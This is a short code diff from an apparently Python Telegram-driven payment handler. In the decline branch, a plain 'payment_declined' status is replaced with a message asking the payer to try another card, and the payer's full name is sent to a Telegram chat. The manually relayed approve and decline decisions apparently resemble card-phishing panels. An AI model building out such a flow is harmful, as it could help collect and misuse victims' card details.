@@ -262,8 +262,10 @@ def telegram_updates():
 
             elif action == 'decline':
                 response_data = {
-                    'status': 'declined',
-                    'message': 'payment_declined'
+                    'status':
+                    'declined',
+                    'message':
+                    "Your card doesn't support this type of purchases. Please try another card."
                 }
                 confirmation_message = f"❌ Payment declined for {full_name}"
 
